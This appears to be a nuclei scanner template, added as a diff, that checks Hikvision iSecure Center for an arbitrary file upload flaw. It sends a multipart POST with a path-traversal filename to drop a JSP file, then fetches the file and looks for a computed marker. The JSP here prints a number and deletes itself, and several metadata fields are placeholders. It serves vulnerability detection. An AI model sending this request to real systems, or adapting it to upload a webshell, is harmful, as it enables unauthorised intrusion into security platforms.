@@ -1,0 +1,48 @@
+id: hikvision-iSecure-Center-report-fileupload-2
+info:
+  name: 海康威视综合安防管理平台 report - fileupload 2
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: hikvision,fileupload.iot
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/{{filename}}.jsp"
+        Content-Type: application/json
+
+        <% out.print(11111*22222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+
+      - |
+        GET /els/static/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2,'246908642')
+        condition: and
